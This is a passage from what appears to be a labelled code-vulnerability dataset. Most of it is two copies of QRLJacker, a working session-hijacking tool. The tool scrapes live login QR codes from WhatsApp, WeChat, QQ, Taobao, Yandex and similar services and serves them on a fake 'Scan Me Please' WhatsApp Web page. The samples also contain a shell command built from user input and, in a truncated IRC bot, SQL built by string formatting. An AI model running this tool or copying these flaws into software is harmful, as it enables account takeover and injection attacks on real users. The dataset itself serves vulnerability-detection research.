imgs[len(imgs)-1]\n\t\t\tprint \" [+]The QR code image found !\"\n\t\t\tsrc = img.get_attribute('src')\n\t\t\tprint \" [+]Downloading the image..\"\n\t\t\tqr = urllib.urlretrieve(src, \"tmp.png\")\n\t\t\tprint \" [#]Saved To tmp.png\"\n\t\t\ttime.sleep(10)\n\t\t\tprint \" [!]Refreshing page...\"\n\t\t\tdriver.refresh()\n\t\t\tcontinue\n\t\texcept:\n\t\t\tbreak\n\ndef WeChat():\n\tdriver = create_driver()\n\ttime.sleep(5)\n\tprint \" [+]Navigating To Website..\"\n\tdriver.get(\"https://web.wechat.com\")\n\ttime.sleep(5)\n\twhile True:\n\t\tprint \"-- --- -- --- -- --- -- --- -- --- --\"\n\t\ttry:\n\t\t\timgs = driver.find_elements_by_tag_name('img')\n\t\t\timg = imgs[0]\n\t\t\tprint \" [+]The QR code image found !\"\n\t\t\tsrc = img.get_attribute('src')\n\t\t\tprint \" [+]Downloading the image..\"\n\t\t\tqr = urllib.urlretrieve(src, \"tmp.png\")\n\t\t\tprint \" [#]Saved To tmp.png\"\n\t\t\ttime.sleep(10)\n\t\t\tcontinue\n\t\texcept:\n\t\t\tbreak\n\ndef QQ():\n\tdriver = create_driver()\n\ttime.sleep(5)\n\tprint \" [+]Navigating To Website..\"\n\tdriver.get(\"http://w.qq.com\")\n\ttime.sleep(10)\n\twhile True:\n\t\tprint \"-- --- -- --- -- --- -- --- -- --- --\"\n\t\ttry:\n\t\t\tdriver.save_screenshot('tmp.png') #screenshot entire page\n\t\t\timg = driver.find_elements_by_tag_name(\"img\")[0]\n\t\t\tprint \" [+]The QR code image found !\"\n\t\t\tlocation = img.location\n\t\t\tsize = img.size\n\t\t\tprint \" [+]Grabbing photo..\"\n\t\t\tScreenshot(\"tmp.png\" ,location ,size)\n\t\t\tprint \" [#]Saved To tmp.png\"\n\t\t\twebdriver.delete_all_cookies()\n\t\t\ttime.sleep(10)\n\t\t\tprint \" [!]Refreshing page...\"\n\t\t\tdriver.refresh()\n\t\t\tcontinue\n\t\texcept:\n\t\t\tbreak\n\ndef Taobao():\n\tdriver = create_driver()\n\ttime.sleep(5)\n\tprint \" [+]Navigating To Website..\"\n\tdriver.get(\"https://login.taobao.com\")\n\ttime.sleep(5)\n\twhile True:\n\t\tprint \"-- --- -- --- -- --- -- --- -- --- --\"\n\t\ttry:\n\t\t\tbutton_class = web.find_element_by_class_name(\"msg-err\")\n\t\t\tbutton = button_class.find_elements_by_tag_name(\"a\")[0]\n\t\t\tprint \" [!]Clicking to reload QR code image...\"\n\t\t\tbutton._execute(webdriver.remote.command.Command.CLICK_ELEMENT)\n\t\t\ttime.sleep(5)\n\t\texcept:\n\t\t\tpass\n\t\ttry:\n\t\t\timgs = driver.find_elements_by_tag_name('img')\n\t\t\timg = imgs[0]\n\t\t\tprint \" [+]The QR code image found !\"\n\t\t\tsrc = img.get_attribute('src')\n\t\t\tprint \" [+]Downloading the image..\"\n\t\t\tqr = urllib.urlretrieve(src, \"tmp.png\")\n\t\t\tprint \" [#]Saved To tmp.png\"\n\t\t\ttime.sleep(10)\n\t\t\tcontinue\n\t\texcept:\n\t\t\tbreak\n\ndef make(typ=\"html\"):\n\tif typ == \"html\":\n\t\tcode = \"\"\"<html>\n<head><title>Whatsapp Web</title></head><body><script>\nvar myTimer;\nmyTimer = window.setInterval(reloadD,3000);\nfunction reloadD(){\nd = new Date();\ndocument.getElementById('qrcodew').src=\"tmp.png?h=\"+d.getTime();\n}\n</script><center><h1><b>Scan Me Please</b></h1>\n<img id=\"qrcodew\" alt=\"Scan me!\" src=\"tmp.png\" style=\"display: block;\"></center>\n</body></html>\"\"\"\n\n\tif typ == \"svg\":\n\t\tcode = \"\"\"<html>\n<head><title>Whatsapp Web</title></head><body><script>\nvar myTimer;\nmyTimer = window.setInterval(reloadD,3000);\nfunction reloadD(){\nd = new Date();\ndocument.getElementById('qrcodew').src=\"tmp.svg?h=\"+d.getTime();\n}\n</script><center><h1><b>Scan Me Please</b></h1>\n<object id=\"qrcodew\" data=\"tmp.svg\" type=\"image/svg+xml\"></object></center>\n</body></html>\"\"\"\n\tf = open(\"index.html\",\"w\")\n\tf.write(code)\n\tf.close()\n\ndef Simple_Exploit(classname,url,image_number,s=10):\n\tdriver = create_driver()\n\ttime.sleep(5)\n\tprint \" [+]Navigating To Website..\"\n\tdriver.get(url)\n\n\twhile True:\n\t\tprint \"-- --- -- --- -- --- -- --- -- --- --\"\n\t\ttry:\n\t\t\tlogin = driver.find_element_by_class_name(classname)\n\t\t\timg = login.find_elements_by_tag_name('img')[int(image_number)]\n\t\t\tprint \" [+]The QR code image found !\"\n\t\t\tsrc = img.get_attribute('src')\n\t\t\tprint \" [+]Downloading the image..\"\n\t\t\tqr = urllib.urlretrieve(src, \"tmp.png\")\n\t\t\tprint \" [#]Saved To tmp.png\"\n\t\t\ttime.sleep(s)\n\t\t\tprint \" [!]Refreshing page...\"\n\t\t\tdriver.refresh()\n\t\t\tcontinue\n\t\texcept:\n\t\t\tbreak\n\ndef main():\n\t#clear()\n\tprint \"\"\"\\n\n\t  ___         _       _               _\n\t / _ \\  _ __ | |     | |  __ _   ___ | | __ ___  _ __\n\t| | | || '__|| |  _  | | / _` | / __|| |/ // _ \\| '__|\n\t| |_| || |   | | | |_| || (_| || (__ |   <|  __/| |\n\t \\__\\_\\|_|   |_|  \\___/  \\__,_| \\___||_|\\_\\\\___||_|\n\n# Hacking With Qrljacking Attack Vector Become Easy\n# Coded By karim Shoair | D4Vinci\n\n Vulnerable Web Applications and Services:\n  1.Chat Applications\n  2.Mailing Services\n  3.eCommerce\n  4.Online Banking\n  5.Passport Services\n  6.Mobile Management Software\n  7.Other Services\n  8.Customization\n\"\"\"\n\tchoice = input(\" Choice > \")\n\n\t#Chat Applications\n\tif choice == 1:\n\t\tprint \"\"\"\n 1.WhatsApp\n 2.WeChat\n 3.Line\n 4.Weibo\n 5.QQ Instant Messaging\n 00.Back To Main Menu\n\t\"\"\"\n\n\t\tchoice_2 = raw_input(\" Second Choice > \")\n\n\t\tif choice_2 == \"00\":\n\t\t\tmain()\n\n\t\t#Whatsapp\n\t\telif int(choice_2) == 1:\n\t\t\tport = raw_input(\" Port to listen on (Default 1337) : \")\n\t\t\ttry:\n\t\t\t\tint(userInput)\n\t\t\texcept ValueError:\n\t\t\t\tport = 1337\n\n\t\t\tif port == \"\":\n\t\t\t\tport = 1337\n\t\t\tclear()\n\t\t\tmake()\n\t\t\tServe_it(port)\n\t\t\twhatsapp()\n\t\t\tmain()\n\n\t\t#Wechat\n\t\telif int(choice_2) == 2:\n\t\t\tport = raw_input(\" Port to listen on (Default 1337) : \")\n\t\t\tif port == \"\":port = 1337\n\t\t\tclear()\n\t\t\tmake()\n\t\t\tServe_it(port)\n\t\t\tWeChat()\n\t\t\tmain()\n\n\t\t#3\n\n\t\t#Weibo\n\t\telif int(choice_2) == 4:\n\t\t\tport = raw_input(\" Port to listen on (Default 1337) : \")\n\t\t\tif port == \"\":port = 1337\n\t\t\tclear()\n\t\t\tmake()\n\t\t\tServe_it(port)\n\t\t\tWeibo()\n\t\t\tmain()\n\n\t\telif int(choice_2) == 5:\n\t\t\tport = raw_input(\" Port to listen on (Default 1337) : \")\n\t\t\tif port == \"\":port = 1337\n\t\t\tclear()\n\t\t\tmake()\n\t\t\tServe_it(port)\n\t\t\tQQ()\n\t\t\tmain()\n\n\t#Mailing Services\n\tif choice == 2:\n\t\tprint \"\"\"\n 1.QQ Mail\n 2.Yandex Mail\n 00.Back To Main Menu\n\t\"\"\"\n\t\tchoice_2 = raw_input(\" Second Choice > \")\n\n\t\tif choice_2 == \"00\":\n\t\t\tmain()\n\n\t\telif int(choice_2) == 2:\n\t\t\tport = raw_input(\" Port to listen on (Default 1337) : \")\n\t\t\tif port == \"\":port = 1337\n\t\t\tclear()\n\t\t\tmake(\"svg\")\n\t\t\tServe_it(port)\n\t\t\tYandex()\n\t\t\tmain()\n\n\t#eCommerce\n\tif choice == 3:\n\t\tprint \"\"\"\n 1.Alibaba\n 2.Aliexpress\n 3.Taobao\n 4.Tmall\n 5.1688.com\n 6.Alimama\n 7.Taobao Trips\n 00.Back To Main Menu\n\t\"\"\"\n\t\tchoice_2 = raw_input(\" Second Choice > \")\n\t\tif choice_2 == \"00\":\n\t\t\tmain()\n\n\t\telif int(choice_2) == 3:\n\t\t\tport = raw_input(\" Port to listen on (Default 1337) : \")\n\t\t\tif port == \"\":port = 1337\n\t\t\tclear()\n\t\t\tmake()\n\t\t\tServe_it(port)\n\t\t\tTaobao()\n\t\t\tmain()\n\n\t\t#4\n\n\t\t#5\n\n\t\t#6\n\n\t\telif int(choice_2) == 7:\n\t\t\tport = raw_input(\" Port to listen on (Default 1337) : \")\n\t\t\tif port == \"\":port = 1337\n\t\t\tclear()\n\t\t\tmake()\n\t\t\tServe_it(port)\n\t\t\tTaobao()\n\t\t\tmain()\n\n\t#Online Banking\n\tif choice == 4:\n\t\tprint \"\"\"\n 1.AliPay\n 2.Yandex Money\n 3.TenPay\n 00.Back To Main Menu\n\t\"\"\"\n\t\tchoice_2 = raw_input(\" Second Choice > \")\n\t\tif choice_2 == \"00\":\n\t\t\tmain()\n\n\t#Passport Services\n\tif choice == 5:\n\t\tprint \"\"\"\n 1.Yandex Passport\n 00.Back To Main Menu\n\t\"\"\"\n\t\tchoice_2 = raw_input(\" Second Choice > \")\n\t\tif choice_2 == \"00\":\n\t\t\tmain()\n\n\t#Mobile Management Software\n\tif choice == 6:\n\t\tprint \"\"\"\n 1.Airdroid\n 00.Back To Main Menu\n\t\"\"\"\n\t\tchoice_2 = raw_input(\" Second Choice > \")\n\n\t\tif choice_2 == \"00\":\n\t\t\tmain()\n\n\t\telif int(choice_2) == 1:\n\t\t\tport = raw_input(\" Port to listen on (Default 1337) : \")\n\t\t\tif port == \"\":port = 1337\n\t\t\tclear()\n\t\t\tmake()\n\t\t\tServe_it(port)\n\t\t\tAirdroid()\n\t\t\tmain()\n\n\t#Other Services\n\tif choice == 7:\n\t\tprint \"\"\"\n 1.MyDigiPass\n 2.Zapper\n 3.Trustly App\n 4.Yelophone\n 5.Alibaba Yunos\n 00.Back To Main Menu\n\"\"\"\n\t\tchoice_2 = raw_input(\" Second Choice > \")\n\t\tif choice_2 == \"00\":\n\t\t\tmain()\n\n\t#Customization\n\t#if choice == 8:\n\t\t#settings.read(\"Data/Simple.ini\")\n\t\t#url = settings.get(\"WeChat\",\"url\")\n\t\t#image_number = settings.get(\"WeChat\",\"image_number\")\n\t\t#classname = settings.get(\"WeChat\",\"classname\")\nif __name__ == '__main__':\n\tmain()\n/n/n/n", "label": 0, "vtype": "command_injection"}, {"id": "a101472db88764a0d031ef85fa283967b0692a77", "code": "/QrlJacking-Framework/QRLJacker.py/n/n#!/usr/bin/env python\n#-*- encoding:utf-8 -*-\n#Author:D4Vinci\nimport base64 ,time ,selenium ,os ,urllib ,sys ,threading ,configparser\nfrom selenium import webdriver\nfrom binascii import a2b_base64\nfrom PIL import Image\n\n#settings = configparser.ConfigParser()\n\ndef Serve_it(port=1337):\n\tdef serve(port):\n\t\tif os.name==\"nt\":\n\t\t\tprint \" [!] Serving files on \"+str(port)+\" port\"\n\t\t\tos.system(\"python -m SimpleHTTPServer \"+str(port)+\" > NUL 2>&1\")\n\t\telse:\n\t\t\tprint \" [!] Serving files on \"+str(port)+\" port\"\n\t\t\tos.system(\"python -m SimpleHTTPServer \"+str(port)+\" > /dev/null 2>&1\")\n\tthreading.Thread(target=serve,args=(port,)).start()\n\ndef create_driver():\n\ttry:\n\t\tweb = webdriver.Firefox()\n\t\tprint \" [+]Opening Mozila FireFox...\"\n\t\treturn web\n\texcept:\n\t\tweb = webdriver.Chrome()\n\t\tprint \" [+]Opening Google Chrome...\"\n\t\treturn web\n\n#Stolen from stackoverflow :D\ndef Screenshot(PicName ,location ,size):\n\timg = Image.open(PicName)#screenshot.png\n\tleft = location['x']\n\ttop = location['y']\n\tright = left + size['width']\n\tbottom = top + size['height']\n\tbox = (int(left), int(top), int(right), int(bottom))\n\tfinal = img.crop(box) # defines crop points\n\tfinal.load()\n\tfinal.save(PicName)\n\ndef whatsapp():\n\tdriver = create_driver()\n\ttime.sleep(5)\n\tprint \" [+]Navigating To Website..\"\n\tdriver.get('https://web.whatsapp.com/')\n\ttime.sleep(5)\n\n\twhile True:\n\t\tprint \"-- --- -- --- -- --- -- --- -- --- --\"\n\t\ttry:\n\t\t\tbutton = driver.find_element_by_class_name('qr-button')\n\t\t\tprint \" [!]Clicking to reload QR code image...\"\n\t\t\tbutton._execute(selenium.webdriver.remote.command.Command.CLICK_ELEMENT)\n\t\t\ttime.sleep(5)\n\t\texcept:\n\t\t\tpass\n\n\t\ttry:\n\t\t\timg = driver.find_elements_by_tag_name('img')[0]\n\t\t\tsrc = img.get_attribute('src').replace(\"data:image/png;base64,\",\"\")\n\t\t\tprint \" [+]The QR code image found !\"\n\t\t\tprint \" [+]Downloading the image..\"\n\t\t\tbinary_data = a2b_base64(src)\n\t\t\tqr = open(\"tmp.png\",\"wb\")\n\t\t\tqr.write(binary_data)\n\t\t\tprint \" [#]Saved To tmp.png\"\n\t\t\tqr.close()\n\t\t\ttime.sleep(5)\n\t\t\tcontinue\n\t\texcept:\n\t\t\tbreak\n\n#make(\"svg\")\ndef Yandex():\n\tprint \"\\n-- --- -- --- -- --- -- --- -- --- --\"\n\tdriver = create_driver()\n\ttime.sleep(5)\n\tprint \" [+]Navigating To Website..\"\n\tdriver.get(\"https://passport.yandex.com/auth?mode=qr\")\n\ttime.sleep(5)\n\twhile True:\n\t\tprint \"-- --- -- --- -- --- -- --- -- --- --\"\n\t\ttry:\n\t\t\timg_url = \"https://passport.yandex.com\" + driver.find_element_by_class_name(\"qr-code__i\").get_attribute(\"style\").split(\"\\\"\")[1].encode(\"utf-8\")\n\t\t\tprint \" [+]The QR code image found !\"\n\t\t\tdata = urllib.urlopen(img_url).read()\n\t\t\tprint \" [+]Downloading the image..\"\n\t\t\tf = open(\"tmp.svg\",\"w\").write(data)\n\t\t\tprint \" [#]Saved To tmp.svg\"\n\t\t\ttime.sleep(10)\n\t\t\tprint \" [!]Refreshing page...\"\n\t\t\tdriver.refresh()\n\t\t\tcontinue\n\t\texcept:\n\t\t\tbreak\n\ndef Airdroid():\n\tdriver = create_driver()\n\ttime.sleep(5)\n\tprint \" [+]Navigating To Website..\"\n\tdriver.get(\"http://web.airdroid.com\")\n\ttime.sleep(5)\n\timg_number = 16\n\trefresh = 0\n\twhile True:\n\t\tprint \"-- --- -- --- -- --- -- --- -- --- --\"\n\t\ttry:\n\t\t\tbutton = driver.find_element_by_class_name(\"widget-login-refresh-qrcode\")[0]\n\t\t\tprint \" [!]Clicking to reload QR code image...\"\n\t\t\tbutton._execute(selenium.webdriver.remote.command.Command.CLICK_ELEMENT)\n\t\t\ttime.sleep(5)\n\t\texcept:\n\t\t\tpass\n\t\ttry:\n\t\t\timgs = driver.find_elements_by_tag_name('img')\n\t\t\timg = imgs[img_number]\n\t\t\tprint \" [+]The QR code image found !\"\n\t\t\tsrc = img.get_attribute('src')\n\t\t\tprint \" [+]Downloading the image..\"\n\t\t\tqr = urllib.urlretrieve(src, \"tmp.png\")\n\t\t\tprint \" [#]Saved To tmp.png\"\n\t\t\ttime.sleep(10)\n\t\t\tif refresh == 0:\n\t\t\t\tprint \" [!]Refreshing page...\"\n\t\t\t\tdriver.refresh()\n\t\t\t\trefresh = 1\n\t\t\timg_number = 15\n\t\t\tcontinue\n\t\texcept:\n\t\t\tbreak\n\ndef Weibo():\n\tdriver = create_driver()\n\ttime.sleep(5)\n\tprint \" [+]Navigating To Website..\"\n\tdriver.get(\"http://weibo.com/login.php\")\n\ttime.sleep(5)\n\twhile True:\n\t\tprint \"-- --- -- --- -- --- -- --- -- --- --\"\n\t\ttry:\n\t\t\timgs = driver.find_elements_by_tag_name('img')\n\t\t\timg = imgs[len(imgs)-1]\n\t\t\tprint \" [+]The QR code image found !\"\n\t\t\tsrc = img.get_attribute('src')\n\t\t\tprint \" [+]Downloading the image..\"\n\t\t\tqr = urllib.urlretrieve(src, \"tmp.png\")\n\t\t\tprint \" [#]Saved To tmp.png\"\n\t\t\ttime.sleep(10)\n\t\t\tprint \" [!]Refreshing page...\"\n\t\t\tdriver.refresh()\n\t\t\tcontinue\n\t\texcept:\n\t\t\tbreak\n\ndef WeChat():\n\tdriver = create_driver()\n\ttime.sleep(5)\n\tprint \" [+]Navigating To Website..\"\n\tdriver.get(\"https://web.wechat.com\")\n\ttime.sleep(5)\n\twhile True:\n\t\tprint \"-- --- -- --- -- --- -- --- -- --- --\"\n\t\ttry:\n\t\t\timgs = driver.find_elements_by_tag_name('img')\n\t\t\timg = imgs[0]\n\t\t\tprint \" [+]The QR code image found !\"\n\t\t\tsrc = img.get_attribute('src')\n\t\t\tprint \" [+]Downloading the image..\"\n\t\t\tqr = urllib.urlretrieve(src, \"tmp.png\")\n\t\t\tprint \" [#]Saved To tmp.png\"\n\t\t\ttime.sleep(10)\n\t\t\tcontinue\n\t\texcept:\n\t\t\tbreak\n\ndef QQ():\n\tdriver = create_driver()\n\ttime.sleep(5)\n\tprint \" [+]Navigating To Website..\"\n\tdriver.get(\"http://w.qq.com\")\n\ttime.sleep(10)\n\twhile True:\n\t\tprint \"-- --- -- --- -- --- -- --- -- --- --\"\n\t\ttry:\n\t\t\tdriver.save_screenshot('tmp.png') #screenshot entire page\n\t\t\timg = driver.find_elements_by_tag_name(\"img\")[0]\n\t\t\tprint \" [+]The QR code image found !\"\n\t\t\tlocation = img.location\n\t\t\tsize = img.size\n\t\t\tprint \" [+]Grabbing photo..\"\n\t\t\tScreenshot(\"tmp.png\" ,location ,size)\n\t\t\tprint \" [#]Saved To tmp.png\"\n\t\t\twebdriver.delete_all_cookies()\n\t\t\ttime.sleep(10)\n\t\t\tprint \" [!]Refreshing page...\"\n\t\t\tdriver.refresh()\n\t\t\tcontinue\n\t\texcept:\n\t\t\tbreak\n\ndef Taobao():\n\tdriver = create_driver()\n\ttime.sleep(5)\n\tprint \" [+]Navigating To Website..\"\n\tdriver.get(\"https://login.taobao.com\")\n\ttime.sleep(5)\n\twhile True:\n\t\tprint \"-- --- -- --- -- --- -- --- -- --- --\"\n\t\ttry:\n\t\t\tbutton_class = web.find_element_by_class_name(\"msg-err\")\n\t\t\tbutton = button_class.find_elements_by_tag_name(\"a\")[0]\n\t\t\tprint \" [!]Clicking to reload QR code image...\"\n\t\t\tbutton._execute(webdriver.remote.command.Command.CLICK_ELEMENT)\n\t\t\ttime.sleep(5)\n\t\texcept:\n\t\t\tpass\n\t\ttry:\n\t\t\timgs = driver.find_elements_by_tag_name('img')\n\t\t\timg = imgs[0]\n\t\t\tprint \" [+]The QR code image found !\"\n\t\t\tsrc = img.get_attribute('src')\n\t\t\tprint \" [+]Downloading the image..\"\n\t\t\tqr = urllib.urlretrieve(src, \"tmp.png\")\n\t\t\tprint \" [#]Saved To tmp.png\"\n\t\t\ttime.sleep(10)\n\t\t\tcontinue\n\t\texcept:\n\t\t\tbreak\n\ndef make(typ=\"html\"):\n\tif typ == \"html\":\n\t\tcode = \"\"\"<html>\n<head><title>Whatsapp Web</title></head><body><script>\nvar myTimer;\nmyTimer = window.setInterval(reloadD,3000);\nfunction reloadD(){\nd = new Date();\ndocument.getElementById('qrcodew').src=\"tmp.png?h=\"+d.getTime();\n}\n</script><center><h1><b>Scan Me Please</b></h1>\n<img id=\"qrcodew\" alt=\"Scan me!\" src=\"tmp.png\" style=\"display: block;\"></center>\n</body></html>\"\"\"\n\n\tif typ == \"svg\":\n\t\tcode = \"\"\"<html>\n<head><title>Whatsapp Web</title></head><body><script>\nvar myTimer;\nmyTimer = window.setInterval(reloadD,3000);\nfunction reloadD(){\nd = new Date();\ndocument.getElementById('qrcodew').src=\"tmp.svg?h=\"+d.getTime();\n}\n</script><center><h1><b>Scan Me Please</b></h1>\n<object id=\"qrcodew\" data=\"tmp.svg\" type=\"image/svg+xml\"></object></center>\n</body></html>\"\"\"\n\tf = open(\"index.html\",\"w\")\n\tf.write(code)\n\tf.close()\n\ndef Simple_Exploit(classname,url,image_number,s=10):\n\tdriver = create_driver()\n\ttime.sleep(5)\n\tprint \" [+]Navigating To Website..\"\n\tdriver.get(url)\n\n\twhile True:\n\t\tprint \"-- --- -- --- -- --- -- --- -- --- --\"\n\t\ttry:\n\t\t\tlogin = driver.find_element_by_class_name(classname)\n\t\t\timg = login.find_elements_by_tag_name('img')[int(image_number)]\n\t\t\tprint \" [+]The QR code image found !\"\n\t\t\tsrc = img.get_attribute('src')\n\t\t\tprint \" [+]Downloading the image..\"\n\t\t\tqr = urllib.urlretrieve(src, \"tmp.png\")\n\t\t\tprint \" [#]Saved To tmp.png\"\n\t\t\ttime.sleep(s)\n\t\t\tprint \" [!]Refreshing page...\"\n\t\t\tdriver.refresh()\n\t\t\tcontinue\n\t\texcept:\n\t\t\tbreak\n\ndef clear():\n\tif os.name == \"nt\":\n\t\tos.system(\"cls\")\n\telse:\n\t\tos.system(\"clear\")\n\ndef main():\n\t#clear()\n\tprint \"\"\"\\n\n\t  ___         _       _               _\n\t / _ \\  _ __ | |     | |  __ _   ___ | | __ ___  _ __\n\t| | | || '__|| |  _  | | / _` | / __|| |/ // _ \\| '__|\n\t| |_| || |   | | | |_| || (_| || (__ |   <|  __/| |\n\t \\__\\_\\|_|   |_|  \\___/  \\__,_| \\___||_|\\_\\\\___||_|\n\n# Hacking With Qrljacking Attack Vector Become Easy\n# Coded By karim Shoair | D4Vinci\n\n Vulnerable Web Applications and Services:\n  1.Chat Applications\n  2.Mailing Services\n  3.eCommerce\n  4.Online Banking\n  5.Passport Services\n  6.Mobile Management Software\n  7.Other Services\n  8.Customization\n\"\"\"\n\tchoice = input(\" Choice > \")\n\n\t#Chat Applications\n\tif choice == 1:\n\t\tprint \"\"\"\n 1.WhatsApp\n 2.WeChat\n 3.Line\n 4.Weibo\n 5.QQ Instant Messaging\n 00.Back To Main Menu\n\t\"\"\"\n\n\t\tchoice_2 = raw_input(\" Second Choice > \")\n\n\t\tif choice_2 == \"00\":\n\t\t\tmain()\n\n\t\t#Whatsapp\n\t\telif int(choice_2) == 1:\n\t\t\tport = raw_input(\" Port to listen on (Default 1337) : \")\n\t\t\tif port == \"\":port = 1337\n\t\t\tclear()\n\t\t\tmake()\n\t\t\tServe_it(port)\n\t\t\twhatsapp()\n\t\t\tmain()\n\n\t\t#Wechat\n\t\telif int(choice_2) == 2:\n\t\t\tport = raw_input(\" Port to listen on (Default 1337) : \")\n\t\t\tif port == \"\":port = 1337\n\t\t\tclear()\n\t\t\tmake()\n\t\t\tServe_it(port)\n\t\t\tWeChat()\n\t\t\tmain()\n\n\t\t#3\n\n\t\t#Weibo\n\t\telif int(choice_2) == 4:\n\t\t\tport = raw_input(\" Port to listen on (Default 1337) : \")\n\t\t\tif port == \"\":port = 1337\n\t\t\tclear()\n\t\t\tmake()\n\t\t\tServe_it(port)\n\t\t\tWeibo()\n\t\t\tmain()\n\n\t\telif int(choice_2) == 5:\n\t\t\tport = raw_input(\" Port to listen on (Default 1337) : \")\n\t\t\tif port == \"\":port = 1337\n\t\t\tclear()\n\t\t\tmake()\n\t\t\tServe_it(port)\n\t\t\tQQ()\n\t\t\tmain()\n\n\t#Mailing Services\n\tif choice == 2:\n\t\tprint \"\"\"\n 1.QQ Mail\n 2.Yandex Mail\n 00.Back To Main Menu\n\t\"\"\"\n\t\tchoice_2 = raw_input(\" Second Choice > \")\n\n\t\tif choice_2 == \"00\":\n\t\t\tmain()\n\n\t\telif int(choice_2) == 2:\n\t\t\tport = raw_input(\" Port to listen on (Default 1337) : \")\n\t\t\tif port == \"\":port = 1337\n\t\t\tclear()\n\t\t\tmake(\"svg\")\n\t\t\tServe_it(port)\n\t\t\tYandex()\n\t\t\tmain()\n\n\t#eCommerce\n\tif choice == 3:\n\t\tprint \"\"\"\n 1.Alibaba\n 2.Aliexpress\n 3.Taobao\n 4.Tmall\n 5.1688.com\n 6.Alimama\n 7.Taobao Trips\n 00.Back To Main Menu\n\t\"\"\"\n\t\tchoice_2 = raw_input(\" Second Choice > \")\n\t\tif choice_2 == \"00\":\n\t\t\tmain()\n\n\t\telif int(choice_2) == 3:\n\t\t\tport = raw_input(\" Port to listen on (Default 1337) : \")\n\t\t\tif port == \"\":port = 1337\n\t\t\tclear()\n\t\t\tmake()\n\t\t\tServe_it(port)\n\t\t\tTaobao()\n\t\t\tmain()\n\n\t\t#4\n\n\t\t#5\n\n\t\t#6\n\n\t\telif int(choice_2) == 7:\n\t\t\tport = raw_input(\" Port to listen on (Default 1337) : \")\n\t\t\tif port == \"\":port = 1337\n\t\t\tclear()\n\t\t\tmake()\n\t\t\tServe_it(port)\n\t\t\tTaobao()\n\t\t\tmain()\n\n\t#Online Banking\n\tif choice == 4:\n\t\tprint \"\"\"\n 1.AliPay\n 2.Yandex Money\n 3.TenPay\n 00.Back To Main Menu\n\t\"\"\"\n\t\tchoice_2 = raw_input(\" Second Choice > \")\n\t\tif choice_2 == \"00\":\n\t\t\tmain()\n\n\t#Passport Services\n\tif choice == 5:\n\t\tprint \"\"\"\n 1.Yandex Passport\n 00.Back To Main Menu\n\t\"\"\"\n\t\tchoice_2 = raw_input(\" Second Choice > \")\n\t\tif choice_2 == \"00\":\n\t\t\tmain()\n\n\t#Mobile Management Software\n\tif choice == 6:\n\t\tprint \"\"\"\n 1.Airdroid\n 00.Back To Main Menu\n\t\"\"\"\n\t\tchoice_2 = raw_input(\" Second Choice > \")\n\n\t\tif choice_2 == \"00\":\n\t\t\tmain()\n\n\t\telif int(choice_2) == 1:\n\t\t\tport = raw_input(\" Port to listen on (Default 1337) : \")\n\t\t\tif port == \"\":port = 1337\n\t\t\tclear()\n\t\t\tmake()\n\t\t\tServe_it(port)\n\t\t\tAirdroid()\n\t\t\tmain()\n\n\t#Other Services\n\tif choice == 7:\n\t\tprint \"\"\"\n 1.MyDigiPass\n 2.Zapper\n 3.Trustly App\n 4.Yelophone\n 5.Alibaba Yunos\n 00.Back To Main Menu\n\"\"\"\n\t\tchoice_2 = raw_input(\" Second Choice > \")\n\t\tif choice_2 == \"00\":\n\t\t\tmain()\n\n\t#Customization\n\t#if choice == 8:\n\t\t#settings.read(\"Data/Simple.ini\")\n\t\t#url = settings.get(\"WeChat\",\"url\")\n\t\t#image_number = settings.get(\"WeChat\",\"image_number\")\n\t\t#classname = settings.get(\"WeChat\",\"classname\")\nif __name__ == '__main__':\n\tmain()\n/n/n/n", "label": 1, "vtype": "command_injection"}, {"id": "b551cd0cd87c3df45fc7787828f3bdd6422a7c72", "code": "bot_sql.py/n/n#!/usr/bin/env python\n# -*- coding: utf-8 -*-\nimport re\nimport socket\nimport sys\nimport urllib2\nimport os\nimport time\nfrom pysqlite2 import dbapi2 as sqlite\n\nchannel = '#masmorra'\nnick = 'carcereiro'\nserver = 'irc.oftc.net' \n\ndef sendmsg(msg): \n    sock.send('PRIVMSG '+ channel + ' :' + str(msg) + '\\r\\n')\n\nclass db():\n\tdef __init__(self, dbfile):\n\t\tif not os.path.exists(dbfile):\n\t\t\tself.conn = sqlite.connect(dbfile)\n\t\t\tself.cursor = self.conn.cursor()\n\t\t\tself.create_table()\n\t\tself.conn = sqlite.connect(dbfile)\n\t\tself.cursor = self.conn.cursor()\n\tdef close(self):\n\t\tself.cursor.close()\n\t\tself.conn.close()\n\tdef create_table(self):\n\t\tself.cursor.execute('CREATE TABLE karma(nome VARCHAR(30) PRIMARY KEY, total INTEGER);')\n\t\tself.cursor.execute('CREATE TABLE url(nome VARCHAR(30) PRIMARY KEY, total INTEGER);')\n\t\tself.cursor.execute('CREATE TABLE slack(nome VARCHAR(30), total INTEGER, data DATE, PRIMARY KEY (data, nome));')\n\t\tself.conn.commit()\n\tdef insert_karma(self,nome,total):\n\t\ttry:\n\t\t\tself.cursor.execute(\"INSERT INTO karma(nome,total) VALUES ('%s', %d );\" % (nome,total))\n\t\t\tself.conn.commit()\n\t\t\treturn True\n\t\texcept:\n\t\t\t#print \"Unexpected error:\", sys.exc_info()[0]\n\t\t\treturn False\n\tdef increment_karma(self,nome):\n\t\tif not self.insert_karma(nome,1):\n\t\t\tself.cursor.execute(\"UPDATE karma SET total = total + 1 where nome = '%s';\" % (nome))\n\t\t\tself.conn.commit()\n\tdef decrement_karma(self,nome):\n\t\tif not self.insert_karma(nome,-1):\n\t\t\tself.cursor.execute(\"UPDATE karma SET total = total - 1 where nome = '%s';\" % (nome))\n\t\t\tself.conn.commit()\n\tdef insert_url(self,nome,total):\n\t\ttry:\n\t\t\tself.cursor.execute(\"INSERT INTO url(nome,total) VALUES ('%s', %d );\" % (nome,total))\n\t\t\tself.conn.commit()\n\t\t\treturn True\n\t\texcept:\n\t\t\treturn False\n\tdef increment_url(self,nome):\n\t\tif not self.insert_url(nome,1):\n\t\t\tself.cursor.execute(\"UPDATE url SET total = total + 1 where nome = '%s';\" % (nome))\n\t\t\tself.conn.commit()\n\tdef insert_slack(self,nome,total):\n\t\ttry:\n\t\t\tself.cursor.execute(\"INSERT INTO slack(nome,total,data) VALUES ('%s', %d, '%s' );\" % (nome,total,time.strftime(\"%Y-%m-%d\", time.localtime())))\n\t\t\tself.conn.commit()\n\t\t\treturn True\n\t\texcept:\n\t\t\treturn False\n\tdef increment_slack(self,nome,total):\n\t\tif not self.insert_slack(nome,total):\n\t\t\tself.cursor.execute(\"UPDATE slack SET total = total + %d where nome = '%s' and data = '%s' ;\" % (total,nome,time.strftime(\"%Y-%m-%d\", time.localtime())))\n\t\t\tself.conn.commit()\n\tdef 